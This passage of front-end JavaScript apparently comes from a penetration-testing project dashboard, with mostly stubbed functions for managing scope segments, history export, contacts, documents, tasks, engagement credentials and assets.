                    const modals = document.querySelectorAll('.modal-overlay.active');
                    modals.forEach(modal => {
                        modal.classList.remove('active');
                    });
                    document.body.style.overflow = '';
                }
            });
            
            // Handle filter button clicks
            const filterBtns = document.querySelectorAll('.filter-btn');
            filterBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    // Remove active from all
                    filterBtns.forEach(b => b.classList.remove('active'));
                    // Add active to clicked
                    this.classList.add('active');
                });
            });
        });
        
        // Prevent body scroll when modal or sidebar is open
        function preventScroll(e) {
            if (sidebarOpen || document.querySelector('.modal-overlay.active')) {
                e.preventDefault();
            }
        }
        
        // Touch support for mobile
        let touchStartX = 0;
        let touchEndX = 0;
        
        document.addEventListener('touchstart', function(e) {
            touchStartX = e.changedTouches[0].screenX;
        }, false);
        
        document.addEventListener('touchend', function(e) {
            touchEndX = e.changedTouches[0].screenX;
            handleSwipe();
        }, false);
        
        function handleSwipe() {
            // Only handle swipes on mobile
            if (window.innerWidth >= 1024) return;
            
            const swipeThreshold = 75;
            const diff = touchEndX - touchStartX;
            
            if (Math.abs(diff) > swipeThreshold) {
                if (diff > 0 && !sidebarOpen && touchStartX < 20) {
                    // Swipe right from edge - open sidebar
                    toggleSidebar();
                } else if (diff < 0 && sidebarOpen) {
                    // Swipe left - close sidebar
                    closeSidebar();
                }
            }
        }
        
        // Scope management functions
        function filterScopeSegments(filter) {
            const segments = document.querySelectorAll('.segment-panel');
            const buttons = document.querySelectorAll('#scope .expenses-panel:first-child .filter-btn');
            
            // Update active button
            buttons.forEach(btn => {
                if (!btn.textContent.includes('Add')) {
                    btn.classList.remove('active');
                }
            });
            event.target.classList.add('active');
            
            // Filter segment panels
            segments.forEach(segment => {
                if (filter === 'all') {
                    segment.style.display = 'block';
                } else {
                    const status = segment.dataset.status;
                    segment.style.display = status === filter ? 'block' : 'none';
                }
            });
        }
        
        function updateSegmentFields() {
            const type = document.getElementById('segmentType').value;
            const nameInput = document.getElementById('segmentName');
            
            const placeholderMap = {
                'external': 'External Perimeter Testing',
                'internal': 'Internal Network Assessment',
                'webapp': 'Customer Portal, Employee Directory, etc.',
                'azure': 'Production Tenant, Development Environment, etc.',
                'aws': 'Production Account, Staging Environment, etc.',
                'gcp': 'Production Project, Development Project, etc.',
                'wireless': 'Corporate WiFi, Guest Network, etc.',
                'mobile': 'iOS App, Android App, etc.',
                'ad': 'Domain Controllers, Group Policies, etc.',
                'iot': 'Smart Devices, Sensors, etc.',
                'firewall': 'Perimeter Firewall, Internal Segmentation, etc.',
                'build': 'Customer API, Mobile App, etc.',
                'breakout': 'Network Segmentation, Privilege Escalation, etc.',
                'other': 'Custom segment description'
            };
            
            nameInput.placeholder = placeholderMap[type] || 'Enter segment name';
        }
        
        function saveSegment() {
            const type = document.getElementById('segmentType').value;
            const name = document.getElementById('segmentName').value;
            const status = document.getElementById('segmentStatus').value;
            const startDate = document.getElementById('segmentStartDate').value;
            const endDate = document.getElementById('segmentEndDate').value;
            const notes = document.getElementById('segmentNotes').value;
            
            if (!name) {
                alert('Please enter a segment name.');
                return;
            }
            
            if (startDate && endDate && new Date(endDate) < new Date(startDate)) {
                alert('End date cannot be before start date.');
                return;
            }
            
            const typeText = document.querySelector(`#segmentType option[value="${type}"]`).textContent;
            let dateInfo = '';
            if (startDate && endDate) {
                dateInfo = ` (${startDate} to ${endDate})`;
            } else if (startDate) {
                dateInfo = ` (starts ${startDate})`;
            } else if (endDate) {
                dateInfo = ` (ends ${endDate})`;
            }
            
            alert(`Test segment "${typeText} - ${name}" saved successfully with status: ${status}${dateInfo}`);
            closeModal('addSegmentModal');
            
            // Reset form
            document.getElementById('segmentName').value = '';
            document.getElementById('segmentStartDate').value = '';
            document.getElementById('segmentEndDate').value = '';
            document.getElementById('segmentNotes').value = '';
        }
        
        function editSegment(btn) {
            const segmentPanel = btn.closest('.segment-panel');
            const titleElement = segmentPanel.querySelector('.panel-title');
            const titleText = titleElement.textContent;
            
            // Change modal title
            document.querySelector('#addSegmentModal .modal-title').textContent = 'Edit Test Segment';
            document.querySelector('#addSegmentModal .btn-primary').textContent = 'Update Segment';
            
            alert(`Edit functionality for segment "${titleText}" would pre-populate the modal with current values.`);
            openModal('addSegmentModal');
            
            // In real implementation, would populate form fields with current segment data
        }
        
        function deleteSegment(btn) {
            const segmentPanel = btn.closest('.segment-panel');
            const titleElement = segmentPanel.querySelector('.panel-title');
            const titleText = titleElement.textContent.split('  ')[0]; // Remove status part
            
            if (confirm(`Are you sure you want to delete the segment "${titleText}"?\n\nThis will also remove all scope items within this segment.`)) {
                segmentPanel.remove();
                alert('Segment deleted successfully.');
            }
        }
        
        let currentSegmentForItem = null;
        
        function addScopeItemToSegment(segmentId) {
            currentSegmentForItem = segmentId;
            const segmentPanel = document.querySelector(`[data-segment="${segmentId}"]`);
            const segmentTitle = segmentPanel.querySelector('.panel-title').textContent.split('  ')[0];
            
            // Update modal title to show context
            document.querySelector('#addScopeItemModal .modal-title').textContent = `Add Item to ${segmentTitle}`;
            
            openModal('addScopeItemModal');
        }
        
        function updateScopeItemFields() {
            const type = document.getElementById('scopeItemType').value;
            const label = document.getElementById('scopeItemLabel');
            const input = document.getElementById('scopeItemTarget');
            
            const fieldMap = {
                'urls': { label: 'URL', placeholder: 'https://example.com' },
                'domains': { label: 'Domain', placeholder: 'example.com' },
                'hosts': { label: 'Hostname/IP', placeholder: 'server.example.com or 192.168.1.100' },
                'config': { label: 'Document Name', placeholder: 'firewall-config.pdf' },
                'azure': { label: 'Azure Resource', placeholder: '/subscriptions/xxx/resourceGroups/xxx' },
                'aws': { label: 'AWS Resource', placeholder: 'arn:aws:ec2:region:account:instance/xxx' },
                'gcp': { label: 'GCP Resource', placeholder: 'projects/project-id/zones/zone/instances/xxx' },
                'wireless': { label: 'SSID', placeholder: 'Corporate-WiFi' },
                'devices': { label: 'Device/App', placeholder: 'Mobile App v1.2.3 (iOS/Android)' }
            };
            
            const field = fieldMap[type];
            label.textContent = field.label;
            input.placeholder = field.placeholder;
        }
        
        function saveScopeItem() {
            const type = document.getElementById('scopeItemType').value;
            const target = document.getElementById('scopeItemTarget').value;
            const notes = document.getElementById('scopeItemNotes').value;
            
            if (!target) {
                alert('Please enter a target/item.');
                return;
            }
            
            if (!currentSegmentForItem) {
                alert('No segment selected. Please use the + Add Item button from within a segment.');
                return;
            }
            
            const segmentPanel = document.querySelector(`[data-segment="${currentSegmentForItem}"]`);
            const segmentTitle = segmentPanel.querySelector('.panel-title').textContent.split('  ')[0];
            
            alert(`Scope item "${target}" (${type}) added to ${segmentTitle}`);
            closeModal('addScopeItemModal');
            
            // Reset form
            document.getElementById('scopeItemTarget').value = '';
            document.getElementById('scopeItemNotes').value = '';
            currentSegmentForItem = null;
        }
        
        function editScopeItem(btn) {
            const scopeItem = btn.closest('.expense-item');
            const target = scopeItem.querySelector('.expense-client').textContent;
            alert(`Edit functionality for scope item "${target}" would open the modal with pre-filled data.`);
            openModal('addScopeItemModal');
        }
        
        function deleteScopeItem(btn) {
            const scopeItem = btn.closest('.expense-item');
            const target = scopeItem.querySelector('.expense-client').textContent;
            if (confirm(`Are you sure you want to remove "${target}" from scope?`)) {
                scopeItem.remove();
            }
        }
        
        function testScopeItem(btn) {
            const scopeItem = btn.closest('.expense-item');
            const target = scopeItem.querySelector('.expense-client').textContent;
            const type = scopeItem.dataset.type;
            alert(`Initiating ${type} testing for: ${target}`);
            // In real implementation, this would launch appropriate testing tools
        }
        
        // History management functions
        function filterHistory(type) {
            const items = document.querySelectorAll('#historyList .expense-item');
            const buttons = document.querySelectorAll('#history .filter-controls .filter-btn');
            
            // Update active button (skip export button)
            buttons.forEach(btn => {
                if (!btn.textContent.includes('Export') && !btn.textContent.includes('Add')) {
                    btn.classList.remove('active');
                }
            });
            event.target.classList.add('active');
            
            // Filter items
            items.forEach(item => {
                if (type === 'all') {
                    item.style.display = 'block';
                } else if (type === 'automated' || type === 'manual') {
                    const itemType = item.dataset.type;
                    item.style.display = itemType === type ? 'block' : 'none';
                } else {
                    const category = item.dataset.category;
                    item.style.display = category === type ? 'block' : 'none';
                }
            });
        }
        
        function saveHistoryEntry() {
            const type = document.getElementById('historyType').value;
            const title = document.getElementById('historyTitle').value;
            const date = document.getElementById('historyDate').value;
            const time = document.getElementById('historyTime').value;
            const notes = document.getElementById('historyNotes').value;
            const severity = document.getElementById('historySeverity').value;
            
            if (!title || !date || !time) {
                alert('Please enter at least a title, date, and time.');
                return;
            }
            
            const severityText = severity ? ` (${severity} severity)` : '';
            alert(`History entry "${title}" saved successfully${severityText}`);
            closeModal('addHistoryModal');
            
            // Reset form
            document.getElementById('historyTitle').value = '';
            document.getElementById('historyDate').value = '';
            document.getElementById('historyTime').value = '';
            document.getElementById('historyNotes').value = '';
            document.getElementById('historySeverity').value = '';
        }
        
        function editHistoryEntry(btn) {
            const historyItem = btn.closest('.expense-item');
            const title = historyItem.querySelector('.expense-client').textContent;
            alert(`Edit functionality for "${title}" would open the modal with pre-filled data.`);
            openModal('addHistoryModal');
        }
        
        function deleteHistoryEntry(btn) {
            const historyItem = btn.closest('.expense-item');
            const title = historyItem.querySelector('.expense-client').textContent;
            if (confirm(`Are you sure you want to delete history entry "${title}"?`)) {
                historyItem.remove();
            }
        }
        
        function exportHistory() {
            // Get current filter state
            const activeFilter = document.querySelector('#history .filter-btn.active').textContent;
            const visibleItems = document.querySelectorAll('#historyList .expense-item[style*="block"], #historyList .expense-item:not([style*="none"])');
            
            // Create export data
            let exportData = `Project Alpha - Testing History Export\n`;
            exportData += `Exported: ${new Date().toLocaleString('en-GB')}\n`;
            exportData += `Filter: ${activeFilter}\n`;
            exportData += `Total Entries: ${visibleItems.length}\n\n`;
            
            visibleItems.forEach((item, index) => {
                const date = item.querySelector('.expense-date').textContent;
                const time = item.querySelector('.expense-amount').textContent;
                const title = item.querySelector('.expense-client').textContent;
                const category = item.querySelector('.expense-category').textContent;
                const notes = item.querySelector('.expense-notes').textContent;
                const type = item.dataset.type;
                
                exportData += `${index + 1}. [${type.toUpperCase()}] ${date} ${time} - ${category}\n`;
                exportData += `   ${title}\n`;
                exportData += `   ${notes}\n\n`;
            });
            
            // Create and download file
            const blob = new Blob([exportData], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `project-alpha-history-${new Date().toISOString().split('T')[0]}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            alert(`History exported successfully! ${visibleItems.length} entries included.`);
        }
        
        // Contact management functions
        function filterContacts(tag) {
            const items = document.querySelectorAll('#contactsList .expense-item');
            const buttons = document.querySelectorAll('#contacts .filter-controls .filter-btn');
            
            // Update active button
            buttons.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            // Filter items
            items.forEach(item => {
                if (tag === 'all') {
                    item.style.display = 'block';
                } else {
                    const tags = item.dataset.tags ? item.dataset.tags.split(',') : [];
                    if (tags.includes(tag)) {
                        item.style.display = 'block';
                    } else {
                        item.style.display = 'none';
                    }
                }
            });
        }
        
        let selectedTags = [];
        function toggleTag(btn, tag) {
            if (btn.classList.contains('active')) {
                btn.classList.remove('active');
                selectedTags = selectedTags.filter(t => t !== tag);
            } else {
                btn.classList.add('active');
                selectedTags.push(tag);
            }
        }
        
        function saveContact() {
            const name = document.getElementById('contactName').value;
            const title = document.getElementById('contactTitle').value;
            const email = document.getElementById('contactEmail').value;
            const phone = document.getElementById('contactPhone').value;
            const notes = document.getElementById('contactNotes').value;
            
            if (!name || !email) {
                alert('Please enter at least a name and email address.');
                return;
            }
            
            alert(`Contact "${name}" saved successfully with tags: ${selectedTags.join(', ')}`);
            closeModal('addContactModal');
            
            // Reset form
            document.getElementById('contactName').value = '';
            document.getElementById('contactTitle').value = '';
            document.getElementById('contactEmail').value = '';
            document.getElementById('contactPhone').value = '';
            document.getElementById('contactNotes').value = '';
            document.querySelectorAll('#addContactModal .category-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            selectedTags = [];
        }
        
        function editContact(btn) {
            const contactItem = btn.closest('.expense-item');
            const name = contactItem.querySelector('.expense-amount').textContent;
            alert(`Edit functionality for "${name}" would open the modal with pre-filled data.`);
            openModal('addContactModal');
        }
        
        function deleteContact(btn) {
            const contactItem = btn.closest('.expense-item');
            const name = contactItem.querySelector('.expense-amount').textContent;
            if (confirm(`Are you sure you want to delete contact "${name}"?`)) {
                contactItem.remove();
            }
        }
        
        // Secure transfer functions
        function openSecureTransfer() {
            const url = document.getElementById('transferUrl').value;
            if (url && url.trim() !== '') {
                window.open(url, '_blank');
            } else {
                alert('No secure transfer link has been set. Please enter a URL first.');
            }
        }
        
        function updateTransferLink() {
            const url = document.getElementById('transferUrl').value;
            const platform = document.getElementById('transferPlatform').value;
            
            if (!url) {
                alert('Please enter a transfer URL.');
                return;
            }
            
            alert('Secure transfer link saved successfully!');
            // Note: In real implementation, this would save to backend/storage
        }
        
        // Document management functions
        function filterDocs(category) {
            const items = document.querySelectorAll('#documentsList .expense-item');
            const buttons = document.querySelectorAll('.filter-controls .filter-btn');
            
            // Update active button
            buttons.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            // Filter items
            items.forEach(item => {
                if (category === 'all' || item.dataset.category === category) {
                    item.style.display = 'block';
                } else {
                    item.style.display = 'none';
                }
            });
        }
        
        function downloadDoc(docId) {
            alert(`Downloading document: ${docId}`);
            // In real implementation, this would trigger file download
        }
        
        function shareDoc(docId) {
            alert(`Generating secure share link for: ${docId}`);
            // In real implementation, this would generate shareable link
        }
        
        function uploadDocument() {
            const title = document.getElementById('docTitle').value;
            const category = document.getElementById('docCategory').value;
            const description = document.getElementById('docDescription').value;
            const fileInput = document.getElementById('fileUpload');
            
            if (!title || !fileInput.files[0]) {
                alert('Please enter a title and select a file.');
                return;
            }
            
            alert(`Document "${title}" uploaded successfully!`);
            closeModal('uploadDocModal');
            
            // Reset form
            document.getElementById('docTitle').value = '';
            document.getElementById('docDescription').value = '';
            fileInput.value = '';
        }
        
        // Task management functions
        function filterTasks(status) {
            const items = document.querySelectorAll('#tasksList .expense-item');
            const buttons = document.querySelectorAll('#tasks .filter-controls .filter-btn');
            
            // Update active button
            buttons.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            // Filter items
            items.forEach(item => {
                if (status === 'all' || item.dataset.status === status) {
                    item.style.display = 'block';
                } else {
                    item.style.display = 'none';
                }
            });
        }
        
        function markTaskComplete(button) {
            const taskItem = button.closest('.expense-item');
            const statusBadge = taskItem.querySelector('.expense-category');
            const amountDiv = taskItem.querySelector('.expense-amount');
            
            // Update visual state
            taskItem.style.opacity = '0.6';
            taskItem.style.borderLeft = '4px solid var(--success)';
            taskItem.dataset.status = 'completed';
            
            // Update status badge
            statusBadge.textContent = 'completed';
            statusBadge.style.background = 'rgba(16, 185, 129, 0.1)';
            statusBadge.style.color = 'var(--success)';
            
            // Update amount/due date
            amountDiv.textContent = ' Done';
            amountDiv.style.color = 'var(--success)';
            
            // Update date
            const dateDiv = taskItem.querySelector('.expense-date');
            dateDiv.textContent = `Completed: ${new Date().toLocaleDateString('en-GB')}`;
            
            // Disable button
            button.textContent = ' Done';
            button.disabled = true;
            button.style.background = 'var(--success)';
            button.style.color = 'white';
            
            // Update task counter
            const counter = document.querySelector('#tasks .total-amount');
            const currentCount = parseInt(counter.textContent);
            counter.textContent = Math.max(0, currentCount - 1);
        }
        
        function addNewTask() {
            const title = document.getElementById('taskTitle').value;
            const category = document.getElementById('taskCategory').value;
            const dueDate = document.getElementById('taskDueDate').value;
            const priority = document.getElementById('taskPriority').value;
            const notes = document.getElementById('taskNotes').value;
            
            if (!title || !dueDate) {
                alert('Please enter a task title and due date.');
                return;
            }
            
            alert(`Task "${title}" added successfully!`);
            closeModal('newTaskModal');
            
            // Reset form
            document.getElementById('taskTitle').value = '';
            document.getElementById('taskDueDate').value = '';
            document.getElementById('taskNotes').value = '';
            
            // Update task counter
            const counter = document.querySelector('#tasks .total-amount');
            const currentCount = parseInt(counter.textContent);
            counter.textContent = currentCount + 1;
        }
        
        // Credential Management Functions
        function filterCredentials(filter) {
            const credentialItems = document.querySelectorAll('#credentialsList .expense-item');
            const filterBtns = document.querySelectorAll('.filter-btn');
            
            // Update active filter button
            filterBtns.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            credentialItems.forEach(item => {
                const show = filter === 'all' || 
                           (filter === 'valid' && item.dataset.status === 'valid') ||
                           (filter === 'admin' && item.dataset.privilege && item.dataset.privilege.includes('admin')) ||
                           (filter === 'service' && item.dataset.type === 'service');
                
                item.style.display = show ? 'flex' : 'none';
            });
        }
        
        function searchCredentials() {
            const searchTerm = document.getElementById('credentialSearch').value.toLowerCase();
            const credentialItems = document.querySelectorAll('#credentialsList .expense-item');
            
            credentialItems.forEach(item => {
                const text = item.textContent.toLowerCase();
                item.style.display = text.includes(searchTerm) ? 'flex' : 'none';
            });
        }
        
        function updateCredentialType() {
            const type = document.getElementById('credentialType').value;
            const keySection = document.getElementById('keySection');
            const hashSection = document.getElementById('hashSection');
            const passwordSection = document.getElementById('passwordSection');
            const certSection = document.getElementById('certSection');
            
            // Hide all optional sections initially
            keySection.style.display = 'none';
            hashSection.style.display = 'none';
            passwordSection.style.display = 'block';
            certSection.style.display = 'none';
            
            // Show relevant sections based on type
            if (type === 'ssh-key' || type === 'api-key') {
                keySection.style.display = 'block';
                passwordSection.style.display = 'none';
            } else if (type === 'hash') {
                hashSection.style.display = 'block';
                passwordSection.style.display = 'none';
            } else if (type === 'certificate') {
                certSection.style.display = 'block';
                passwordSection.style.display = 'none';
            }
        }
        
        function togglePasswordVisibility(inputId) {
            const input = document.getElementById(inputId);
            const button = event.target;
            
            if (input.type === 'password') {
                input.type = 'text';
                button.textContent = '';
            } else {
                input.type = 'password';
                button.textContent = '';
            }
        }
        
        function addCredential() {
            const username = document.getElementById('credUsername').value;
            const type = document.getElementById('credentialType').value;
            const source = document.getElementById('credentialSource').value;
            
            if (!username || !type || !source) {
                alert('Please enter username, type, and source.');
                return;
            }
            
            alert('Credential added successfully!');
            closeModal('addCredentialModal');
            
            // Reset form
            document.getElementById('credentialForm').reset();
            updateCredentialType();
        }
        
        function testCredential(btn) {
            const credItem = btn.closest('.expense-item');
            const username = credItem.querySelector('.expense-client').textContent;
            
            btn.innerHTML = ' Testing...';
            btn.disabled = true;
            
            setTimeout(() => {
                const success = Math.random() > 0.3; // 70% success rate for demo
                if (success) {
                    btn.innerHTML = ' Valid';
                    btn.style.background = 'var(--success)';
                    credItem.dataset.status = 'valid';
                    const statusBadge = credItem.querySelector('.expense-amount');
                    statusBadge.textContent = 'Valid';
                    statusBadge.style.color = 'var(--success)';
                } else {
                    btn.innerHTML = ' Failed';
                    btn.style.background = 'var(--danger)';
                    credItem.dataset.status = 'invalid';
                    const statusBadge = credItem.querySelector('.expense-amount');
                    statusBadge.textContent = 'Invalid';
                    statusBadge.style.color = 'var(--danger)';
                }
                btn.disabled = false;
            }, 2000);
        }
        
        function copyCredential(btn) {
            const credItem = btn.closest('.expense-item');
            const notes = credItem.querySelector('.expense-notes').textContent;
            const passwordMatch = notes.match(/Password: ([^|]+)/);
            
            if (passwordMatch) {
                navigator.clipboard.writeText(passwordMatch[1].trim()).then(() => {
                    btn.innerHTML = ' Copied';
                    setTimeout(() => {
                        btn.innerHTML = '';
                    }, 2000);
                });
            } else {
                alert('No password found to copy');
            }
        }
        
        function editCredential(btn) {
            const credItem = btn.closest('.expense-item');
            const username = credItem.querySelector('.expense-client').textContent;
            alert(`Edit functionality for credential "${username}" would open the modal with pre-filled data.`);
            openModal('addCredentialModal');
        }
        
        function deleteCredential(btn) {
            const credItem = btn.closest('.expense-item');
            const username = credItem.querySelector('.expense-client').textContent;
            if (confirm(`Are you sure you want to delete the credential for "${username}"?`)) {
                credItem.remove();
                alert('Credential deleted successfully.');
            }
        }
        
        // Project Management Functions (Moved to Dashboard)
        // Dropdown functionality removed - project management now handled in Dashboard
        
        // Project CRUD Functions
        function updateProject() {
            const projectName = document.getElementById('editProjectName').value;
            const projectRef = document.getElementById('editProjectRef').value;
            const clientName = document.getElementById('editClientName').value;
            const projectType = document.getElementById('editProjectType').value;
            
            if (!projectName || !clientName) {
                alert('Please enter project name and client name.');
                return;
            }
            
            // Update the header display
            document.querySelector('.project-name-compact').textContent = projectName;
            document.querySelector('.project-ref-compact').textContent = projectRef;
            
            alert(`Project "${projectName}" updated successfully!`);
            closeModal('editProjectModal');
        }
        
        function createProject() {
            const projectName = document.getElementById('newProjectName').value;
            const clientName = document.getElementById('newClientName').value;
            const projectType = document.getElementById('newProjectType').value;
            
            if (!projectName || !clientName || !projectType) {
                alert('Please fill in all required fields (marked with *).');
                return;
            }
            
            // Generate project reference
            const typePrefix = {
                'pentest': 'PT',
                'va': 'VA', 
                'red-team': 'RT',
                'compliance': 'CA',
                'code-review': 'CR',
                'architecture': 'AR',
                'social-engineering': 'SE'
            };
            
            const prefix = typePrefix[projectType] || 'PR';
            const year = new Date().getFullYear();
            const randomNum = Math.floor(Math.random() * 900) + 100;
            const projectRef = `${prefix}-${year}-${randomNum}`;
            
            // Update the project selector with new project
            document.querySelector('.project-name-compact').textContent = projectName;
            document.querySelector('.project-ref-compact').textContent = `#${projectRef}`;
            
            // Add to dropdown (in a real app, this would persist to database)
            const dropdown = document.querySelector('.project-dropdown');
            const newItem = document.createElement('div');
            newItem.className = 'project-dropdown-item active';
            newItem.innerHTML = `
                <div class="project-dropdown-name">${projectName}</div>
                <div class="project-dropdown-ref">#${projectRef}</div>
                <div class="project-dropdown-status">Planning</div>
            `;
            
            // Remove active from other items and add to new
            document.querySelectorAll('.project-dropdown-item').forEach(item => {
                item.classList.remove('active');
            });
            
            dropdown.insertBefore(newItem, dropdown.querySelector('.project-dropdown-divider'));
            
            alert(`Project "${projectName}" created successfully with reference ${projectRef}!`);
            closeModal('newProjectModal');
            
            // Reset form
            document.getElementById('newProjectForm').reset();
        }
        
        // Auto-generate project reference when project name changes
        function generateProjectReference() {
            const projectName = document.getElementById('newProjectName').value;
            const projectType = document.getElementById('newProjectType').value;
            
            if (projectName && projectType) {
                const typePrefix = {
                    'pentest': 'PT',
                    'va': 'VA', 
                    'red-team': 'RT',
                    'compliance': 'CA',
                    'code-review': 'CR',
                    'architecture': 'AR',
                    'social-engineering': 'SE'
                };
                
                const prefix = typePrefix[projectType] || 'PR';
                const year = new Date().getFullYear();
                const randomNum = Math.floor(Math.random() * 900) + 100;
                const projectRef = `${prefix}-${year}-${randomNum}`;
                
                document.getElementById('newProjectRef').value = projectRef;
                document.getElementById('newProjectRef').style.background = 'var(--bg-primary)';
            }
        }
        
        // Add event listeners for auto-generation
        document.addEventListener('DOMContentLoaded', function() {
            const newProjectName = document.getElementById('newProjectName');
            const newProjectType = document.getElementById('newProjectType');
            
            if (newProjectName && newProjectType) {
                newProjectName.addEventListener('input', generateProjectReference);
                newProjectType.addEventListener('change', generateProjectReference);
            }
        });
        
        // Assets Management Functions
        function toggleAssetDetails(row) {
            const servicesRow = row.nextElementSibling;
            const expandIcon = row.querySelector('.expand-icon');
            
            if (servicesRow && servicesRow.classList.contains('services-row')) {
                const isExpanded = servicesRow.classList.contains('show');
                
                if (isExpanded) {
                    servicesRow.classList.remove('show');
                    row.classList.remove('expanded');
                    expandIcon.style.transform = 'rotate(0deg)';
                } else {
                    servicesRow.classList.add('show');
                    row.classList.add('expanded');
                    expandIcon.style.transform = 'rotate(90deg)';
                }
            }
        }
        
        function filterAssets(filter) {
            const assetRows = document.querySelectorAll('.asset-row:not(.services-row)');
            const mobileCards = document.querySelectorAll('.asset-card');
            const filterBtns = document.querySelectorAll('.assets-filters .filter-btn');
            
            // Update active filter button
            filterBtns.forEach(btn => {
                if (btn.textContent.toLowerCase().includes(filter) || filter === 'all') {
                    btn.classList.toggle('active', btn.textContent.toLowerCase().includes(filter) || filter === 'all');
                } else {
                    btn.classList.remove('active');
                }
            });
            
            // Filter table rows
            assetRows.forEach(row => {
                const show = filter === 'all' || 
                           (filter === 'host' && row.dataset.type === 'host') ||
                           (filter === 'webapp' && row.dataset.type === 'webapp') ||
                           (filter === 'database' && row.dataset.type === 'database') ||
                           (filter === 'network' && row.dataset.type === 'network') ||
                           (filter === 'cloud' && row.dataset.type === 'cloud') ||
                           (filter === 'not-started' && row.dataset.status === 'not-started') ||
                           (filter === 'testing' && row.dataset.status === 'testing') ||
                           (filter === 'complete' && row.dataset.status === 'complete') ||
                           (filter === 'critical' && row.dataset.criticality === 'critical') ||
                           (filter === 'high' && row.dataset.criticality === 'high') ||
                           (filter === 'medium' && row.dataset.criticality === 'medium') ||
                           (filter === 'low' && row.dataset.criticality === 'low');
                
                row.style.display = show ? 'table-row' : 'none';
                
                // Also hide/show associated services row
                const servicesRow = row.nextElementSibling;
                if (servicesRow && servicesRow.classList.contains('services-row')) {
                    servicesRow.style.display = show ? 'table-row' : 'none';
                }
            });
            
            // Filter mobile cards (simplified for demo)
            mobileCards.forEach(card => {
                // In real implementation, would filter based on data attributes
                card.style.display = 'block';
            });
        }
        
        function searchAssets() {
            const searchTerm = document.getElementById('assetSearch').value.toLowerCase();
            const assetRows = document.querySelectorAll('.asset-row:not(.services-row)');
            const mobileCards = document.querySelectorAll('.asset-card');
            
            // Search table rows
            assetRows.forEach(row => {
                const text = row.textContent.toLowerCase();
                const show = text.includes(searchTerm);
                
                row.style.display = show ? 'table-row' : 'none';
                
                // Also hide/show associated services row
                const servicesRow = row.nextElementSibling;
                if (servicesRow && servicesRow.classList.contains('services-row')) {
                    servicesRow.style.display = show ? 'table-row' : 'none';
                }
            });
            
            // Search mobile cards
            mobileCards.forEach(card => {
                const text = card.textContent.toLowerCase();
                card.style.display = text.includes(searchTerm) ? 'block' : 'none';
            });
        }
        
        function toggleSelectAll(checkbox) {
            const assetCheckboxes = document.querySelectorAll('.asset-checkbox');
            assetCheckboxes.forEach(cb => {
                cb.checked = checkbox.checked;
            });
            updateBulkActions();
        }
        
        function updateBulkActions() {
            const checkedBoxes = document.querySelectorAll('.asset-checkbox:checked');
            const bulkActions = document.getElementById('bulkActions');
            const selectedCount = document.getElementById('selectedCount');
            
            if (checkedBoxes.length > 0) {
                bulkActions.style.display = 'flex';
                selectedCount.textContent = checkedBoxes.length;
            } else {
                bulkActions.style.display = 'none';
            }
        }
        
        // Add event listeners to asset checkboxes
        document.addEventListener('change', function(event) {
            if (event.target.classList.contains('asset-checkbox')) {
                updateBulkActions();
            }
        });
        
        function sortAssets(column) {
            alert(`Sorting by ${column} - in a real implementation, this would sort the table data.`);
        }
        
        function editAsset(btn) {
            const row = btn.closest('tr') || btn.closest('.asset-card');
            const assetName = row.querySelector('strong')?.textContent || row.querySelector('.asset-card-title')?.textContent;
            alert(`Edit asset: ${assetName}`);
        }
        
        function testAsset(btn) {
            const row = btn.closest('tr') || btn.closest('.asset-card');
            const assetName = row.querySelector('strong')?.textContent || row.querySelector('.asset-card-title')?.textContent;
            alert(`Starting test for asset: ${assetName}`);
        }
        
        function viewFindings(btn) {
            const row = btn.closest('tr') || btn.closest('.asset-card');
            const assetName = row.querySelector('strong')?.textContent || row.querySelector('.asset-card-title')?.textContent;
            alert(`View findings for asset: ${assetName}`);
        }
        
        function exportAssets() {
            alert('Exporting assets to CSV - in real implementation, would generate and download file.');
        }
        
        function bulkMarkTesting() {
            alert('Marking selected assets as Testing');
        }
        
        function bulkMarkComplete() {
            alert('Marking selected assets as Complete');
        }
        
        function bulkSetCriticality() {
            alert('Setting criticality for selected assets');
        }
        
        function bulkDelete() {
            if (confirm('Are you sure you want to delete the selected assets?')) {
                alert('Deleting selected assets');
            }
        }
        
        // Double-click row functionality
        function initializeDoubleClickHandlers() {
            // Assets table double-click
            document.querySelectorAll('#assetsTable .asset-row:not(.services-row)').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const name = this.querySelector('td:nth-child(2) strong')?.textContent || 'Asset';
                    const type = this.querySelector('.asset-type')?.textContent || 'Unknown';
                    const status = this.querySelector('.status')?.textContent || 'Unknown';
                    openAssetDetails(name, type, status, this.dataset);
                });
            });
            
            // Tasks table double-click
            document.querySelectorAll('#tasksTable .asset-row').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const name = this.querySelector('td:nth-child(2) strong')?.textContent || 'Task';
                    const category = this.querySelector('.asset-type')?.textContent || 'Unknown';
                    const status = this.querySelector('.status')?.textContent || 'Unknown';
                    openTaskDetails(name, category, status, this.dataset);
                });
            });
            
            // Contacts table double-click
            document.querySelectorAll('#contactsTable .asset-row').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const name = this.querySelector('td:nth-child(2) strong')?.textContent || 'Contact';
                    const role = this.querySelector('td:nth-child(3)')?.textContent || 'Unknown';
                    const email = this.querySelector('td:nth-child(4) a')?.textContent || 'Unknown';
                    openContactDetails(name, role, email, this.dataset);
                });
            });
            
            // Credentials table double-click
            document.querySelectorAll('#credentialsTable .asset-row').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const username = this.querySelector('td:nth-child(2) strong')?.textContent || 'Credential';
                    const type = this.querySelector('.asset-type')?.textContent || 'Unknown';
                    const status = this.querySelector('.status')?.textContent || 'Unknown';
                    openCredentialDetails(username, type, status, this.dataset);
                });
            });
            
            // History table double-click
            document.querySelectorAll('#historyTable .asset-row').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const time = this.querySelector('td:nth-child(2) strong')?.textContent || 'Event';
                    const event = this.querySelector('td:nth-child(3) strong')?.textContent || 'Unknown';
                    const category = this.querySelector('.tag')?.textContent || 'Unknown';
                    openHistoryDetails(time, event, category, this.dataset);
                });
            });
